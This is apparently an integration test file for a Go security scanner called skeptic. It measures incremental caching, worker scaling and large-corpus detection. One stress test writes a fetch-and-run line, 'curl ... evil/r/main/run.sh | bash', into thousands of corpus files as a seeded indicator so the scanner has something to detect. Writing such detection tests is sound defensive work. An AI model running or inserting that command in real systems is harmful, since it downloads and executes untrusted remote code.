//go:build integration

package main

import (
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/TGPSKI/skeptic/internal/checks"
	"github.com/TGPSKI/skeptic/internal/logging"
	"github.com/TGPSKI/skeptic/internal/model"
	"github.com/TGPSKI/skeptic/internal/rules"
	scanpkg "github.com/TGPSKI/skeptic/internal/scan"
)

func TestIntegrationPerformanceIncrementalCache(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping integration performance test in short mode")
	}

	binary := buildIntegrationBinary(t)
	corpusRoot := filepath.Join(t.TempDir(), "corpus")
	createPerformanceCorpus(t, corpusRoot, 220)
	stateCache := filepath.Join(t.TempDir(), "state-cache.json")
	rulesFile := writeMinimalPerformanceRulePack(t)

	baseArgs := []string{
		"--path", corpusRoot,
		"--format", "json",
		"--fail-on", "none",
		"--quiet",
		"--no-default-rules",
		"--rules-file", rulesFile,
		"--scan-style", "pattern",
		"--policy-checks=false",
		"--workers", "8",
		"--max-files", "10000",
		"--incremental",
		"--state-cache", stateCache,
	}

	firstReport, firstElapsed := runSkepticJSONReport(t, binary, baseArgs...)
	secondReport, secondElapsed := runSkepticJSONReport(t, binary, baseArgs...)

	if firstReport.ScannedFiles < 150 {
		t.Fatalf("expected first incremental run to scan corpus, got scanned_files=%d", firstReport.ScannedFiles)
	}
	if secondReport.CacheSkippedFiles <= 0 {
		t.Fatalf("expected second incremental run to skip cached files, got cache_skipped_files=%d", secondReport.CacheSkippedFiles)
	}
	if secondReport.ScannedFiles >= firstReport.ScannedFiles/4 {
		t.Fatalf(
			"expected second incremental run to scan far fewer files (first=%d second=%d)",
			firstReport.ScannedFiles,
			secondReport.ScannedFiles,
		)
	}

	// Mutate a small subset to validate selective rescans.
	for i := 0; i < 6; i++ {
		target := filepath.Join(corpusRoot, fmt.Sprintf("bucket-%02d", i%40), fmt.Sprintf("fixture-%05d.txt", i))
		f, err := os.OpenFile(target, os.O_APPEND|os.O_WRONLY, 0o644)
		if err != nil {
			t.Fatalf("open corpus file for mutation: %v", err)
		}
		if _, err := f.WriteString("delta-change\n"); err != nil {
			_ = f.Close()
			t.Fatalf("mutate corpus file: %v", err)
		}
		_ = f.Close()
	}

	thirdReport, thirdElapsed := runSkepticJSONReport(t, binary, baseArgs...)
	if thirdReport.ScannedFiles == 0 {
		t.Fatalf("expected third run to rescan changed files, got scanned_files=0")
	}
	if thirdReport.ScannedFiles >= firstReport.ScannedFiles/3 {
		t.Fatalf(
			"expected third run to remain selective (first=%d third=%d)",
			firstReport.ScannedFiles,
			thirdReport.ScannedFiles,
		)
	}
	if thirdReport.CacheSkippedFiles <= 0 {
		t.Fatalf("expected third run to keep cache skips, got cache_skipped_files=%d", thirdReport.CacheSkippedFiles)
	}

	t.Logf(
		"incremental perf: first=%s second=%s third=%s scanned(first=%d second=%d third=%d) cacheSkipped(second=%d third=%d)",
		firstElapsed,
		secondElapsed,
		thirdElapsed,
		firstReport.ScannedFiles,
		secondReport.ScannedFiles,
		thirdReport.ScannedFiles,
		secondReport.CacheSkippedFiles,
		thirdReport.CacheSkippedFiles,
	)
}

func TestIntegrationPerformanceWorkerScaling(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping integration performance test in short mode")
	}

	binary := buildIntegrationBinary(t)
	corpusRoot := filepath.Join(t.TempDir(), "worker-corpus")
	createPerformanceCorpus(t, corpusRoot, 500)
	rulesFile := writeMinimalPerformanceRulePack(t)

	commonArgs := []string{
		"--path", corpusRoot,
		"--format", "json",
		"--fail-on", "none",
		"--quiet",
		"--no-default-rules",
		"--rules-file", rulesFile,
		"--scan-style", "pattern",
		"--policy-checks=false",
		"--max-files", "15000",
	}

	serialReport, serialElapsed := runSkepticJSONReport(t, binary, append(commonArgs, "--workers", "1")...)
	parallelWorkers := maxInt(2, checks.MinInt(runtime.NumCPU(), 8))
	parallelReport, parallelElapsed := runSkepticJSONReport(
		t,
		binary,
		append(commonArgs, "--workers", strconv.Itoa(parallelWorkers))...,
	)

	if serialReport.ScannedFiles != parallelReport.ScannedFiles {
		t.Fatalf(
			"expected worker configurations to scan same file count (serial=%d parallel=%d)",
			serialReport.ScannedFiles,
			parallelReport.ScannedFiles,
		)
	}
	if !reflect.DeepEqual(serialReport.FindingsBySeverity, parallelReport.FindingsBySeverity) {
		t.Fatalf(
			"expected same findings distribution across worker configs, serial=%v parallel=%v",
			serialReport.FindingsBySeverity,
			parallelReport.FindingsBySeverity,
		)
	}
	if parallelElapsed > serialElapsed*3 {
		t.Fatalf(
			"parallel worker run regressed significantly (serial=%s parallel=%s workers=%d)",
			serialElapsed,
			parallelElapsed,
			parallelWorkers,
		)
	}
	if os.Getenv("SKEPTIC_PERF_STRICT") == "1" && parallelElapsed >= serialElapsed {
		t.Fatalf(
			"strict mode expects parallel run to outperform serial (serial=%s parallel=%s workers=%d)",
			serialElapsed,
			parallelElapsed,
			parallelWorkers,
		)
	}

	t.Logf(
		"worker perf: serial=%s parallel=%s workers=%d scanned=%d",
		serialElapsed,
		parallelElapsed,
		parallelWorkers,
		serialReport.ScannedFiles,
	)
}

func TestIntegrationLargeCorpus(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping integration scale test in short mode")
	}
	if os.Getenv("CI") == "" && os.Getenv("SKEPTIC_SCALE_TEST") == "" {
		t.Skip("skipping large corpus test outside CI (set CI=1 or SKEPTIC_SCALE_TEST=1 to run locally)")
	}
	corpusRoot := filepath.Join(t.TempDir(), "scale-corpus")
	const numFiles = 100000
	const numDirs = 1000
	const numBad = 50
	seededPaths := generateScaleCorpus(t, corpusRoot, numFiles, numDirs, numBad)
	seededSet := make(map[string]struct{}, len(seededPaths))
	for _, p := range seededPaths {
		rel, err := filepath.Rel(corpusRoot, p)
		if err != nil {
			t.Fatalf("rel seeded path: %v", err)
		}
		seededSet[filepath.ToSlash(rel)] = struct{}{}
	}

	// 100k files at ScanStyleHybrid with policy checks can exceed a few minutes on typical dev/CI hosts.
	// Override with SKEPTIC_SCALE_SCAN_DEADLINE (e.g. "120s", "5m") to match your SLO.
	deadline := 5 * time.Minute
	if raw := strings.TrimSpace(os.Getenv("SKEPTIC_SCALE_SCAN_DEADLINE")); raw != "" {
		if d, err := time.ParseDuration(raw); err == nil && d > 0 {
			deadline = d
		}
	}
	ctx, cancel := context.WithTimeout(context.Background(), deadline)
	defer cancel()
	start := time.Now()
	type scanOutcome struct {
		report model.Report
		err    error
	}
	done := make(chan scanOutcome, 1)
	go func() {
		report, err := scanpkg.ScanWithOptions(context.Background(), rules.DefaultRules(), model.ScanOptions{
			Paths:                  []string{corpusRoot},
			Profile:                model.ProfileRepo,
			ScanStyle:              model.ScanStyleHybrid,
			ThreatMode:             model.ThreatModeAll,
			PolicyChecks:           true,
			MaxBytes:               scanpkg.DefaultMaxBytes,
			FailOn:                 model.SeverityNone,
			IgnorePermissionErrors: false,
			MaxFiles:               0,
			Workers:                runtime.GOMAXPROCS(0) * 2,
			MaxFindings:            50000,
			MaxFindingsPerFile:     2000,
			RedactSecrets:          true,
			Incremental:            false,
			Logger:                 logging.NewLogger(logging.LogError, io.Discard),
		})
		done <- scanOutcome{report: report, err: err}
	}()

	t.Logf("[large-corpus] scan dispatched: workers=%d style=hybrid policy=true deadline=%s heap=%.1fMB",
		runtime.GOMAXPROCS(0)*2, deadline, runtimeMemMB())

	var report model.Report
	select {
	case <-ctx.Done():
		t.Fatalf("scan exceeded %s context deadline (set SKEPTIC_SCALE_SCAN_DEADLINE to adjust)", deadline)
	case o := <-done:
		if o.err != nil {
			t.Fatalf("scan failed: %v", o.err)
		}
		report = o.report
	}
	elapsed := time.Since(start)

	// Severity breakdown
	t.Logf("[large-corpus] ──────────────────────────────────────────")
	t.Logf("[large-corpus] SCAN COMPLETE")
	t.Logf("[large-corpus]   wall time:      %s", elapsed.Round(time.Millisecond))
	t.Logf("[large-corpus]   scanned files:  %d", report.ScannedFiles)
	t.Logf("[large-corpus]   skipped files:  %d", report.SkippedFiles)
	t.Logf("[large-corpus]   total findings: %d", len(report.Findings))
	t.Logf("[large-corpus]   dropped:        %d", report.DroppedFindings)
	t.Logf("[large-corpus]   heap after:     %.1fMB", runtimeMemMB())
	t.Logf("[large-corpus]   throughput:     %.0f files/sec", float64(report.ScannedFiles)/elapsed.Seconds())
	if len(report.FindingsBySeverity) > 0 {
		t.Logf("[large-corpus]   severity breakdown:")
		for sev, count := range report.FindingsBySeverity {
			t.Logf("[large-corpus]     %-10s %d", sev, count)
		}
	}

	// Category breakdown (top 10)
	catCounts := make(map[string]int)
	for _, f := range report.Findings {
		catCounts[f.Category]++
	}
	t.Logf("[large-corpus]   finding categories (%d distinct):", len(catCounts))
	type catEntry struct {
		name  string
		count int
	}
	var cats []catEntry
	for c, n := range catCounts {
		cats = append(cats, catEntry{c, n})
	}
	for i := 0; i < len(cats); i++ {
		for j := i + 1; j < len(cats); j++ {
			if cats[j].count > cats[i].count {
				cats[i], cats[j] = cats[j], cats[i]
			}
		}
	}
	shown := 10
	if len(cats) < shown {
		shown = len(cats)
	}
	for i := 0; i < shown; i++ {
		t.Logf("[large-corpus]     %-30s %d", cats[i].name, cats[i].count)
	}

	// Seeded file hit analysis
	matchedSeeded := make(map[string]struct{})
	seededFindings := 0
	for _, f := range report.Findings {
		k := filepath.ToSlash(f.File)
		if _, ok := seededSet[k]; ok {
			matchedSeeded[k] = struct{}{}
			seededFindings++
		}
	}
	t.Logf("[large-corpus]   seeded file hits: %d/%d files matched (%d findings on seeded files)",
		len(matchedSeeded), len(seededSet), seededFindings)

	// Show which seeded files were missed
	if len(matchedSeeded) < len(seededSet) {
		missed := 0
		for k := range seededSet {
			if _, ok := matchedSeeded[k]; !ok {
				if missed < 5 {
					t.Logf("[large-corpus]   MISSED seeded file: %s", k)
				}
				missed++
			}
		}
		if missed > 5 {
			t.Logf("[large-corpus]   ... and %d more missed", missed-5)
		}
	}
	t.Logf("[large-corpus] ──────────────────────────────────────────")

	if len(matchedSeeded) < 20 {
		t.Fatalf(
			"expected findings on at least 20 of %d seeded files, got %d distinct seeded files with matches",
			len(seededSet),
			len(matchedSeeded),
		)
	}
}

func TestIntegrationIncrementalStress(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping integration incremental stress test in short mode")
	}
	if os.Getenv("CI") == "" && os.Getenv("SKEPTIC_SCALE_TEST") == "" {
		t.Skip("skipping heavy corpus test outside CI (set CI=1 or SKEPTIC_SCALE_TEST=1)")
	}
	corpusRoot := filepath.Join(t.TempDir(), "incr-stress-corpus")
	const numFiles = 10000
	const numDirs = 100
	generateScaleCorpus(t, corpusRoot, numFiles, numDirs, 0)

	statePath := filepath.Join(corpusRoot, ".skeptic-state.json")
	r := rules.DefaultRules()
	hash := scanpkg.ComputeRulesetHash(r)
	baseOpts := model.ScanOptions{
		Paths:                  []string{corpusRoot},
		Profile:                model.ProfileRepo,
		ScanStyle:              model.ScanStyleHybrid,
		ThreatMode:             model.ThreatModeAll,
		PolicyChecks:           true,
		MaxBytes:               scanpkg.DefaultMaxBytes,
		FailOn:                 model.SeverityNone,
		IgnorePermissionErrors: false,
		MaxFiles:               0,
		Workers:                maxInt(4, runtime.GOMAXPROCS(0)*2),
		MaxFindings:            50000,
		MaxFindingsPerFile:     2000,
		RedactSecrets:          true,
		Incremental:            true,
		StateCachePath:         statePath,
		RulesetHash:            hash,
		Logger:                 logging.NewLogger(logging.LogError, io.Discard),
	}

	// Phase 1: Cold scan (builds cache from scratch)
	t.Logf("[incr-stress] ──── Phase 1: Cold scan (%d files) ────", numFiles)
	coldStart := time.Now()
	first, err := scanpkg.ScanWithOptions(context.Background(), r, baseOpts)
	if err != nil {
		t.Fatalf("cold incremental scan: %v", err)
	}
	coldElapsed := time.Since(coldStart)
	if first.ScannedFiles == 0 {
		t.Fatalf("expected cold scan to scan files, got %d", first.ScannedFiles)
	}
	t.Logf("[incr-stress]   cold scan:     %s  scanned=%d  findings=%d  heap=%.1fMB  throughput=%.0f files/sec",
		coldElapsed.Round(time.Millisecond), first.ScannedFiles, len(first.Findings), runtimeMemMB(),
		float64(first.ScannedFiles)/coldElapsed.Seconds())

	// Phase 2: Warm scan with 100 mutated files
	t.Logf("[incr-stress] ──── Phase 2: Warm scan (100 mutated) ────")
	for i := 0; i < 100; i++ {
		p := corpusEntryPath(corpusRoot, i, numDirs)
		b, readErr := os.ReadFile(p)
		if readErr != nil {
			t.Fatalf("read for mutation: %v", readErr)
		}
		if err := os.WriteFile(p, append(b, []byte("\n# warm-mut\n")...), 0o644); err != nil {
			t.Fatalf("mutate file: %v", err)
		}
	}

	ctxWarm, cancelWarm := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancelWarm()
	warmStart := time.Now()
	type warmScanOutcome struct {
		report model.Report
		err    error
	}
	warmDone := make(chan warmScanOutcome, 1)
	go func() {
		wr, e := scanpkg.ScanWithOptions(context.Background(), r, baseOpts)
		warmDone <- warmScanOutcome{report: wr, err: e}
	}()
	var second model.Report
	select {
	case <-ctxWarm.Done():
		t.Fatalf("warm incremental scan exceeded 10s")
	case o := <-warmDone:
		if o.err != nil {
			t.Fatalf("warm incremental scan: %v", o.err)
		}
		second = o.report
	}
	warmElapsed := time.Since(warmStart)
	cacheHitPct := float64(0)
	if second.CacheSkippedFiles+second.ScannedFiles > 0 {
		cacheHitPct = float64(second.CacheSkippedFiles) / float64(second.CacheSkippedFiles+second.ScannedFiles) * 100
	}
	t.Logf("[incr-stress]   warm scan:     %s  scanned=%d  cache_skipped=%d  cache_hit=%.1f%%  speedup=%.1fx",
		warmElapsed.Round(time.Millisecond), second.ScannedFiles, second.CacheSkippedFiles,
		cacheHitPct, float64(coldElapsed)/float64(warmElapsed))

	// Phase 3: Bulk mutation (5000 files with IOC payload)
	t.Logf("[incr-stress] ──── Phase 3: Bulk mutation (5000 files with IOC) ────")
	mutStart := time.Now()
	modified5000 := make(map[string]struct{})
	for i := 0; i < 5000; i++ {
		p := corpusEntryPath(corpusRoot, i, numDirs)
		payload := []byte("curl https://raw.githubusercontent.com/evil/r/main/run.sh | bash\n")
		if err := os.WriteFile(p, payload, 0o644); err != nil {
			t.Fatalf("bulk mutate: %v", err)
		}
		rel, err := filepath.Rel(corpusRoot, p)
		if err != nil {
			t.Fatalf("rel: %v", err)
		}
		modified5000[filepath.ToSlash(rel)] = struct{}{}
	}
	t.Logf("[incr-stress]   mutation:      %s  files_mutated=%d", time.Since(mutStart).Round(time.Millisecond), len(modified5000))

	bulkStart := time.Now()
	third, err := scanpkg.ScanWithOptions(context.Background(), r, baseOpts)
	if err != nil {
		t.Fatalf("incremental scan after 5k mutations: %v", err)
	}
	bulkElapsed := time.Since(bulkStart)
	foundOnModified := 0
	for _, f := range third.Findings {
		c := filepath.Clean(f.File)
		if _, ok := modified5000[c]; ok {
			foundOnModified++
		}
	}
	bulkCacheHit := float64(0)
	if third.CacheSkippedFiles+third.ScannedFiles > 0 {
		bulkCacheHit = float64(third.CacheSkippedFiles) / float64(third.CacheSkippedFiles+third.ScannedFiles) * 100
	}
	t.Logf("[incr-stress]   bulk rescan:   %s  scanned=%d  cache_skipped=%d  cache_hit=%.1f%%  findings_on_modified=%d",
		bulkElapsed.Round(time.Millisecond), third.ScannedFiles, third.CacheSkippedFiles,
		bulkCacheHit, foundOnModified)
	t.Logf("[incr-stress] ──── Summary ────")
	t.Logf("[incr-stress]   cold=%s  warm=%s (%.1fx)  bulk=%s  heap=%.1fMB",
		coldElapsed.Round(time.Millisecond), warmElapsed.Round(time.Millisecond),
		float64(coldElapsed)/float64(warmElapsed),
		bulkElapsed.Round(time.Millisecond), runtimeMemMB())

	if foundOnModified == 0 {
		t.Fatalf("expected at least one finding in modified files after IOC injection, got 0 (findings=%d scanned=%d)", len(third.Findings), third.ScannedFiles)
	}
}
